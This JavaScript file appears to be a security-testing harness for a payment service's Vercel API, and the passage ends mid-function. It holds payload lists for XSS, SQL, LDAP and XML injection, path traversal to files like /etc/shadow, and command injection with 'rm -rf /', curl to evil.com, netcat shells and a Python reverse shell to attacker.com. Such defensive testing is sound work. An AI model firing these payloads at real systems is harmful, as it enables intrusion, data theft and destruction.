import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import axios from 'axios';
import { v4 as uuidv4 } from 'uuid';
import crypto from 'crypto';

/**
 * Advanced Security Testing Utilities for Ödeal Vercel Functions
 * Provides sophisticated security testing capabilities including input validation,
 * XSS, SQL injection, and advanced attack vector testing
 */

// Advanced security test configuration
const ADVANCED_SECURITY_CONFIG = {
  baseUrl: process.env.VERCEL_URL || 'http://localhost:3000',
  validAuthKey: process.env.ODEAL_REQUEST_KEY || 'test-key',
  testTimeout: 30000,
  requestTimeout: 10000,
  maxConcurrentRequests: 20,
  fuzzingIterations: 100,
  attackPatterns: {
    xss: [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
      "'\"><script>alert(\"xss\")</script>",
      '<iframe src="javascript:alert(\'xss\')">',
      '<body onload=alert("xss")>',
      '<input onfocus=alert("xss") autofocus>',
      '<select onfocus=alert("xss") autofocus>',
      '<textarea onfocus=alert("xss") autofocus>',
      '<keygen onfocus=alert("xss") autofocus>',
      '<video><source onerror=alert("xss")>',
      '<audio src=x onerror=alert("xss")>',
      '<details open ontoggle=alert("xss")>',
      '<marquee onstart=alert("xss")>',
      '" onclick="alert(\'xss\')"',
      '\' onclick="alert(\'xss\')\'',
      '` onclick="alert(\'xss\')`',
      '${alert("xss")}',
      '#{alert("xss")}',
      '%{alert("xss")}',
      '{{alert("xss")}}',
      '/*<script>alert("xss")</script>*/',
      '//<script>alert("xss")</script>',
      '<!--<script>alert("xss")</script>-->',
      '<![CDATA[<script>alert("xss")</script>]]>',
      '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
      '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
      '<object data="javascript:alert(\'xss\')">',
      '<embed src="javascript:alert(\'xss\')">',
      '<applet code="javascript:alert(\'xss\')">',
      '<isindex type="image" src="javascript:alert(\'xss\')">',
      '<form action="javascript:alert(\'xss\')">',
      '<button formaction="javascript:alert(\'xss\')">',
      '<input type="image" formaction="javascript:alert(\'xss\')">',
      '<background src="javascript:alert(\'xss\')">',
      '<bgsound src="javascript:alert(\'xss\')">',
      '<track src="javascript:alert(\'xss\')">',
      '<source src="javascript:alert(\'xss\')">',
      '<picture><source srcset="javascript:alert(\'xss\')">'
    ],
    sqlInjection: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 1=1#",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "' UNION SELECT NULL--",
      "' UNION SELECT username, password FROM users--",
      "'; DROP TABLE users;--",
      "1' OR '1'='1",
      "1' OR 1=1--",
      "admin' OR '1'='1",
      "' OR SLEEP(5)--",
      "' OR BENCHMARK(1000000,MD5(NOW()))--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "' OR 1=1 IN ((SELECT TABLE_NAME FROM information_schema.tables))--",
      "' PROCEDURE ANALYSE(EXTRACTVALUE(7858,CONCAT(0x5c,0x71786b7071,(SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,54)) FROM information_schema.tables WHERE table_schema=DATABASE()),0x7171786b71)),1)--",
      "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
      "' OR 1=CONVERT(INT,(SELECT COUNT(*) FROM information_schema.tables))--",
      "' WAITFOR DELAY '0:0:5'--",
      "'; DECLARE @t VARCHAR(255) SELECT @t = 'x' WAITFOR DELAY '0:0:5'--"
    ],
    commandInjection: [
      "; ls -la",
      "| ls -la",
      "&& ls -la",
      "|| ls -la",
      "$(ls -la)",
      "`ls -la`",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "&& cat /etc/passwd",
      "|| cat /etc/passwd",
      "$(cat /etc/passwd)",
      "`cat /etc/passwd`",
      "; rm -rf /",
      "| rm -rf /",
      "&& rm -rf /",
      "|| rm -rf /",
      "$(rm -rf /)",
      "`rm -rf /`",
      "; curl http://evil.com",
      "| curl http://evil.com",
      "&& curl http://evil.com",
      "|| curl http://evil.com",
      "$(curl http://evil.com)",
      "`curl http://evil.com`",
      "; nc -l -p 1337 -e /bin/bash",
      "| nc -l -p 1337 -e /bin/bash",
      "&& nc -l -p 1337 -e /bin/bash",
      "|| nc -l -p 1337 -e /bin/bash",
      "$(nc -l -p 1337 -e /bin/bash)",
      "`nc -l -p 1337 -e /bin/bash`",
      "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      "&& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      "|| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\");')",
      "`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\");'`"
    ],
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "/etc/passwd",
      "C:\\Windows\\System32\\drivers\\etc\\hosts",
      "/proc/self/environ",
      "/proc/self/cmdline",
      "/proc/self/mounts",
      "/proc/self/maps",
      "/proc/self/status",
      "/proc/self/fd/0",
      "/proc/self/fd/1",
      "/proc/self/fd/2",
      "/proc/self/root/etc/passwd",
      "/var/www/html/index.php",
      "/var/log/apache2/access.log",
      "/var/log/nginx/access.log",
      "/var/log/mysql/mysql.log",
      "/var/log/postgresql/postgresql.log",
      "/var/lib/mysql/mysql/user.frm",
      "/etc/shadow",
      "/etc/hosts",
      "/etc/hostname",
      "/etc/resolv.conf",
      "/etc/issue",
      "/etc/motd",
      "/etc/group",
      "/etc/gshadow",
      "/etc/sudoers",
      "/etc/crontab",
      "/etc/fstab",
      "/etc/mtab",
      "/etc/protocols",
      "/etc/services",
      "/etc/networks",
      "/etc/rpc",
      "/etc/inetd.conf",
      "/etc/xinetd.conf",
      "/etc/syslog.conf",
      "/etc/httpd/conf/httpd.conf",
      "/etc/apache2/apache2.conf",
      "/etc/nginx/nginx.conf"
    ],
    ldapInjection: [
      "*",
      "*)(&",
      "*)(&))",
      "*(|(objectclass=*))",
      "*(|(objectclass=*)(objectclass=user))",
      "admin)(&))",
      "admin*)(|(objectclass=user))",
      "admin*))%00",
      "admin*)%00",
      "*)(uid=*))",
      "*)(cn=*))",
      "*)(mail=*))",
      "*)(telephoneNumber=*))",
      "*)(description=*))",
      "*)(givenName=*))",
      "*)(sn=*))",
      "*)(ou=*))",
      "*)(o=*))",
      "*)(l=*))",
      "*)(st=*))",
      "*)(street=*))",
      "*)(postalCode=*))",
      "*)(postOfficeBox=*))",
      "*)(facsimileTelephoneNumber=*))",
      "*)(internationaliSDNNumber=*))",
      "*)(telexNumber=*))",
      "*)(teletexTerminalIdentifier=*))",
      "*)(telephoneNumber=*))",
      "*)(preferredDeliveryMethod=*))",
      "*)(destinationIndicator=*))",
      "**(registeredAddress=*))",
      "*)(x121Address=*))",
      "*)(physicalDeliveryOfficeName=*))",
      "*)(stateOrProvinceName=*))",
      "**(postalAddress=*))",
      "**(postalCode=*))",
      "**(postOfficeBox=*))",
      "**(physicalDeliveryOfficeName=*))",
      "**(streetAddress=*))",
      "**(domainComponent=*))",
      "**(dc=*))",
      "**(uid=*))",
      "**(cn=*))",
      "**(sn=*))",
      "**(givenName=*))",
      "**(mail=*))"
    ],
    xmlInjection: [
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/malicious.dtd\">]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><root></root>",
      "<![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>]]>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/random\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/urandom\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/mounts\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/maps\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/status\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/fd/0\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/fd/1\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/fd/2\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/root/etc/passwd\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/index.php\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/nginx/access.log\" >]><root>&xxe;</root>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/mysql/mysql.log\" >]><root>&xxe;</root>"
    ]
  }
};

/**
 * Input Validation Testing Utilities
 * Tests for XSS, SQL injection, command injection, and other input validation issues
 */
export class InputValidationTester {
  constructor(baseUrl = ADVANCED_SECURITY_CONFIG.baseUrl) {
    this.baseUrl = baseUrl;
    this.results = [];
  }

  /**
   * Test Cross-Site Scripting (XSS) vulnerabilities
   */
  async testXSSVulnerabilities(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'header') {
    console.log(`🕷️ Testing XSS vulnerabilities on ${endpoint} in ${payloadLocation}...`);

    const xssResults = [];
    const attackPatterns = ADVANCED_SECURITY_CONFIG.attackPatterns.xss;

    for (const pattern of attackPatterns) {
      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'header') {
          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': pattern,
              'User-Agent': pattern,
              'Referer': pattern
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?test=${encodeURIComponent(pattern)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, {
            test: pattern,
            malicious: pattern
          }, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const reflectedXSS = responseBody.includes(pattern) ||
                            responseBody.includes(pattern.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
        const executedXSS = responseBody.toLowerCase().includes('alert') ||
                           responseBody.toLowerCase().includes('script') ||
                           responseBody.toLowerCase().includes('onerror=') ||
                           responseBody.toLowerCase().includes('onload=');

        const result = {
          testType: 'XSS',
          payloadLocation,
          pattern,
          status: response.status,
          responseTime: endTime - startTime,
          reflectedXSS,
          executedXSS,
          responseBodyLength: responseBody.length,
          recommendation: reflectedXSS || executedXSS
            ? '⚠️ POTENTIAL XSS VULNERABILITY: Malicious script may have been executed'
            : '✅ XSS payload properly sanitized'
        };

        xssResults.push(result);

        if (reflectedXSS || executedXSS) {
          console.warn(`   XSS Pattern: ${pattern.substring(0, 50)}... - ${result.recommendation}`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 50));

      } catch (error) {
        const result = {
          testType: 'XSS',
          payloadLocation,
          pattern,
          status: 'NETWORK_ERROR',
          error: error.message,
          reflectedXSS: false,
          executedXSS: false,
          recommendation: '✅ Request blocked (network error)'
        };

        xssResults.push(result);
      }
    }

    const overallResult = {
      testType: 'XSS Testing',
      endpoint,
      payloadLocation,
      totalPatterns: attackPatterns.length,
      reflectedPatterns: xssResults.filter(r => r.reflectedXSS).length,
      executedPatterns: xssResults.filter(r => r.executedXSS).length,
      vulnerablePatterns: xssResults.filter(r => r.reflectedXSS || r.executedXSS).length,
      results: xssResults,
      isVulnerable: xssResults.some(r => r.reflectedXSS || r.executedXSS),
      recommendation: xssResults.some(r => r.reflectedXSS || r.executedXSS)
        ? '⚠️ XSS vulnerabilities detected'
        : '✅ No XSS vulnerabilities detected'
    };

    this.results.push(overallResult);
    console.log(`📊 XSS Testing Results (${payloadLocation}):`);
    console.log(`   Total patterns: ${attackPatterns.length}`);
    console.log(`   Reflected: ${overallResult.reflectedPatterns}`);
    console.log(`   Executed: ${overallResult.executedPatterns}`);
    console.log(`   Vulnerable: ${overallResult.vulnerablePatterns}`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  /**
   * Test SQL Injection vulnerabilities
   */
  async testSQLInjection(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'query') {
    console.log(`🗄️ Testing SQL injection on ${endpoint} in ${payloadLocation}...`);

    const sqlResults = [];
    const attackPatterns = ADVANCED_SECURITY_CONFIG.attackPatterns.sqlInjection;

    for (const pattern of attackPatterns) {
      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?id=${encodeURIComponent(pattern)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'header') {
          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'X-Custom-Header': pattern
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, {
            query: pattern,
            filter: pattern
          }, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const sqlErrorIndicators = [
          'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysql_connect',
          'postgresql', 'pg_query', 'pg_exec', 'ora_', 'mssql_',
          'sqlite_', 'odbc_', 'dblib_', 'ibase_', 'oci_',
          'you have an error in your sql syntax', 'warning: mysql',
          'unclosed quotation mark', 'quoted string not properly terminated',
          'syntax error', 'fatal error', 'database error'
        ];

        const containsSQLError = sqlErrorIndicators.some(indicator =>
          responseBody.toLowerCase().includes(indicator)
        );

        const timingAttack = endTime - startTime > 5000; // 5 second threshold for timing-based SQLi

        const result = {
          testType: 'SQL Injection',
          payloadLocation,
          pattern,
          status: response.status,
          responseTime: endTime - startTime,
          containsSQLError,
          timingAttack,
          responseBodyLength: responseBody.length,
          recommendation: containsSQLError || timingAttack
            ? '⚠️ POTENTIAL SQL INJECTION: Database error or timing attack detected'
            : '✅ SQL injection attempt properly blocked'
        };

        sqlResults.push(result);

        if (containsSQLError || timingAttack) {
          console.warn(`   SQLi Pattern: ${pattern.substring(0, 30)}... - ${result.recommendation}`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 100));

      } catch (error) {
        const result = {
          testType: 'SQL Injection',
          payloadLocation,
          pattern,
          status: 'NETWORK_ERROR',
          error: error.message,
          containsSQLError: false,
          timingAttack: false,
          recommendation: '✅ Request blocked (network error)'
        };

        sqlResults.push(result);
      }
    }

    const overallResult = {
      testType: 'SQL Injection Testing',
      endpoint,
      payloadLocation,
      totalPatterns: attackPatterns.length,
      errorPatterns: sqlResults.filter(r => r.containsSQLError).length,
      timingPatterns: sqlResults.filter(r => r.timingAttack).length,
      vulnerablePatterns: sqlResults.filter(r => r.containsSQLError || r.timingAttack).length,
      results: sqlResults,
      isVulnerable: sqlResults.some(r => r.containsSQLError || r.timingAttack),
      recommendation: sqlResults.some(r => r.containsSQLError || r.timingAttack)
        ? '⚠️ SQL injection vulnerabilities detected'
        : '✅ No SQL injection vulnerabilities detected'
    };

    this.results.push(overallResult);
    console.log(`📊 SQL Injection Testing Results (${payloadLocation}):`);
    console.log(`   Total patterns: ${attackPatterns.length}`);
    console.log(`   Error patterns: ${overallResult.errorPatterns}`);
    console.log(`   Timing patterns: ${overallResult.timingPatterns}`);
    console.log(`   Vulnerable patterns: ${overallResult.vulnerablePatterns}`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  /**
   * Test Command Injection vulnerabilities
   */
  async testCommandInjection(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'query') {
    console.log(`💻 Testing command injection on ${endpoint} in ${payloadLocation}...`);

    const cmdResults = [];
    const attackPatterns = ADVANCED_SECURITY_CONFIG.attackPatterns.commandInjection;

    for (const pattern of attackPatterns) {
      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?cmd=${encodeURIComponent(pattern)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'header') {
          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'X-Cmd-Header': pattern
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, {
            command: pattern,
            filename: pattern
          }, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const commandOutputIndicators = [
          'root:', 'daemon:', 'bin:', 'sys:', 'sync:', 'games:', 'man:',
          'lp:', 'mail:', 'news:', 'uucp:', 'proxy:', 'www-data:',
          'backup:', 'list:', 'irc:', 'gnats:', 'nobody:',
          'system32', 'windows', 'program files', 'documents and settings',
          'total ', 'drwxr', 'lrwxr', '-rw-r', 'crw-r', 'brw-r',
          'uid=', 'gid=', 'groups=', 'user=', 'home=',
          'shell=', 'path=', 'term=', 'lang=', 'display='
        ];

        const containsCommandOutput = commandOutputIndicators.some(indicator =>
          responseBody.toLowerCase().includes(indicator)
        );

        const timingAttack = endTime - startTime > 10000; // 10 second threshold for command execution

        const result = {
          testType: 'Command Injection',
          payloadLocation,
          pattern,
          status: response.status,
          responseTime: endTime - startTime,
          containsCommandOutput,
          timingAttack,
          responseBodyLength: responseBody.length,
          recommendation: containsCommandOutput || timingAttack
            ? '⚠️ POTENTIAL COMMAND INJECTION: Command execution detected'
            : '✅ Command injection attempt properly blocked'
        };

        cmdResults.push(result);

        if (containsCommandOutput || timingAttack) {
          console.warn(`   Cmd Pattern: ${pattern.substring(0, 30)}... - ${result.recommendation}`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 200));

      } catch (error) {
        const result = {
          testType: 'Command Injection',
          payloadLocation,
          pattern,
          status: 'NETWORK_ERROR',
          error: error.message,
          containsCommandOutput: false,
          timingAttack: false,
          recommendation: '✅ Request blocked (network error)'
        };

        cmdResults.push(result);
      }
    }

    const overallResult = {
      testType: 'Command Injection Testing',
      endpoint,
      payloadLocation,
      totalPatterns: attackPatterns.length,
      outputPatterns: cmdResults.filter(r => r.containsCommandOutput).length,
      timingPatterns: cmdResults.filter(r => r.timingAttack).length,
      vulnerablePatterns: cmdResults.filter(r => r.containsCommandOutput || r.timingAttack).length,
      results: cmdResults,
      isVulnerable: cmdResults.some(r => r.containsCommandOutput || r.timingAttack),
      recommendation: cmdResults.some(r => r.containsCommandOutput || r.timingAttack)
        ? '⚠️ Command injection vulnerabilities detected'
        : '✅ No command injection vulnerabilities detected'
    };

    this.results.push(overallResult);
    console.log(`📊 Command Injection Testing Results (${payloadLocation}):`);
    console.log(`   Total patterns: ${attackPatterns.length}`);
    console.log(`   Output patterns: ${overallResult.outputPatterns}`);
    console.log(`   Timing patterns: ${overallResult.timingPatterns}`);
    console.log(`   Vulnerable patterns: ${overallResult.vulnerablePatterns}`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  /**
   * Test Path Traversal vulnerabilities
   */
  async testPathTraversal(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'query') {
    console.log(`📁 Testing path traversal on ${endpoint} in ${payloadLocation}...`);

    const traversalResults = [];
    const attackPatterns = ADVANCED_SECURITY_CONFIG.attackPatterns.pathTraversal;

    for (const pattern of attackPatterns) {
      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?file=${encodeURIComponent(pattern)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'header') {
          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'X-File-Header': pattern
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, {
            filename: pattern,
            path: pattern
          }, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const fileContentIndicators = [
          'root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:', 'sys:x:3:3:',
          'sync:x:4:65534:', 'games:x:5:60:', 'man:x:6:12:', 'lp:x:7:7:',
          'mail:x:8:8:', 'news:x:9:9:', 'uucp:x:10:10:', 'proxy:x:13:13:',
          'www-data:x:33:33:', 'backup:x:34:34:', 'list:x:38:38:',
          'irc:x:39:39:', 'gnats:x:41:41:', 'nobody:x:65534:65534:',
          '# Copyright (c) 1993-2009 Microsoft Corp.',
          '# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.',
          '# localhost name resolution is handled within DNS itself.',
          '127.0.0.1       localhost',
          '::1             localhost',
          '127.0.1.1      ',
          '127.0.0.1       localhost.localdomain',
          '127.0.0.1       localhost',
          '::1             localhost',
          '::1             ip6-localhost',
          'fe00::0         ip6-localnet',
          'ff00::0         ip6-mcastprefix',
          'ff02::1         ip6-allnodes',
          'ff02::2         ip6-allrouters',
          'ff02::3         ip6-allhosts'
        ];

        const containsFileContent = fileContentIndicators.some(indicator =>
          responseBody.toLowerCase().includes(indicator)
        );

        const timingAttack = endTime - startTime > 3000; // 3 second threshold for file access

        const result = {
          testType: 'Path Traversal',
          payloadLocation,
          pattern,
          status: response.status,
          responseTime: endTime - startTime,
          containsFileContent,
          timingAttack,
          responseBodyLength: responseBody.length,
          recommendation: containsFileContent || timingAttack
            ? '⚠️ POTENTIAL PATH TRAVERSAL: File access detected'
            : '✅ Path traversal attempt properly blocked'
        };

        traversalResults.push(result);

        if (containsFileContent || timingAttack) {
          console.warn(`   Traversal Pattern: ${pattern.substring(0, 30)}... - ${result.recommendation}`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 100));

      } catch (error) {
        const result = {
          testType: 'Path Traversal',
          payloadLocation,
          pattern,
          status: 'NETWORK_ERROR',
          error: error.message,
          containsFileContent: false,
          timingAttack: false,
          recommendation: '✅ Request blocked (network error)'
        };

        traversalResults.push(result);
      }
    }

    const overallResult = {
      testType: 'Path Traversal Testing',
      endpoint,
      payloadLocation,
      totalPatterns: attackPatterns.length,
      contentPatterns: traversalResults.filter(r => r.containsFileContent).length,
      timingPatterns: traversalResults.filter(r => r.timingAttack).length,
      vulnerablePatterns: traversalResults.filter(r => r.containsFileContent || r.timingAttack).length,
      results: traversalResults,
      isVulnerable: traversalResults.some(r => r.containsFileContent || r.timingAttack),
      recommendation: traversalResults.some(r => r.containsFileContent || r.timingAttack)
        ? '⚠️ Path traversal vulnerabilities detected'
        : '✅ No path traversal vulnerabilities detected'
    };

    this.results.push(overallResult);
    console.log(`📊 Path Traversal Testing Results (${payloadLocation}):`);
    console.log(`   Total patterns: ${attackPatterns.length}`);
    console.log(`   Content patterns: ${overallResult.contentPatterns}`);
    console.log(`   Timing patterns: ${overallResult.timingPatterns}`);
    console.log(`   Vulnerable patterns: ${overallResult.vulnerablePatterns}`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  /**
   * Test LDAP Injection vulnerabilities
   */
  async testLDAPInjection(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'query') {
    console.log(`🔍 Testing LDAP injection on ${endpoint} in ${payloadLocation}...`);

    const ldapResults = [];
    const attackPatterns = ADVANCED_SECURITY_CONFIG.attackPatterns.ldapInjection;

    for (const pattern of attackPatterns) {
      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?user=${encodeURIComponent(pattern)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'header') {
